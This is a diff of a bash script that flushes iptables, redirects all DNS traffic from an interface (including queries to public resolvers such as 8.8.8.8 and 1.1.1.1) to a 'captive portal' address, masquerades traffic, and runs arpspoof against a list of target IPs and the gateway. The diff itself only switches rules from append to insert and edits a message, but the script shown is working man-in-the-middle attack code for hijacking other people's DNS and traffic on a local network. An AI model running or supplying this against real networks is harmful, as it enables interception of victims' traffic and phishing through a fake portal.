@@ -62,25 +62,25 @@ iptables -F
 iptables -t nat -F
 
 # Redirect DNS traffic (UDP and TCP) to captive portal
-iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j DNAT --to-destination $PORTAL_IP
-iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 53 -j DNAT --to-destination $PORTAL_IP
+iptables -t nat -I PREROUTING -i $INTERFACE -p udp --dport 53 -j DNAT --to-destination $PORTAL_IP
+iptables -t nat -I PREROUTING -i $INTERFACE -p tcp --dport 53 -j DNAT --to-destination $PORTAL_IP
 
 # Redirect common public DNS servers
 for DNS in 8.8.8.8 8.8.4.4 1.1.1.1 1.0.0.1; do
-    iptables -t nat -A PREROUTING -i $INTERFACE -p udp -d $DNS --dport 53 -j DNAT --to-destination $PORTAL_IP
+    iptables -t nat -I PREROUTING -i $INTERFACE -p udp -d $DNS --dport 53 -j DNAT --to-destination $PORTAL_IP
 done
 
 # Allow access to the captive portal
-iptables -t nat -A PREROUTING -i $INTERFACE -d $PORTAL_IP -j ACCEPT
+iptables -t nat -I PREROUTING -i $INTERFACE -d $PORTAL_IP -j ACCEPT
 
 # Exempt device and gateway IPs
-iptables -t nat -A PREROUTING -i $INTERFACE -s $DEVICE_IP -j ACCEPT
-iptables -t nat -A PREROUTING -i $INTERFACE -d $DEVICE_IP -j ACCEPT
-iptables -t nat -A PREROUTING -i $INTERFACE -s $GATEWAY_IP -j ACCEPT
-iptables -t nat -A PREROUTING -i $INTERFACE -d $GATEWAY_IP -j ACCEPT
+iptables -t nat -I PREROUTING -i $INTERFACE -s $DEVICE_IP -j ACCEPT
+iptables -t nat -I PREROUTING -i $INTERFACE -d $DEVICE_IP -j ACCEPT
+iptables -t nat -I PREROUTING -i $INTERFACE -s $GATEWAY_IP -j ACCEPT
+iptables -t nat -I PREROUTING -i $INTERFACE -d $GATEWAY_IP -j ACCEPT
 
 # Masquerade outgoing traffic
-iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE
+iptables -t nat -I POSTROUTING -o $INTERFACE -j MASQUERADE
 
 # Start ARP spoofing for each target IP
 for TARGET_IP in "${TARGET_IPS[@]}"; do
@@ -88,5 +88,5 @@ for TARGET_IP in "${TARGET_IPS[@]}"; do
     arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP &
 done
 
-echo "Captive portal setup complete. Press Ctrl+C to stop ARP spoofing."
+echo "Captive portal setup complete. Press Ctrl+C to stop."
 wait
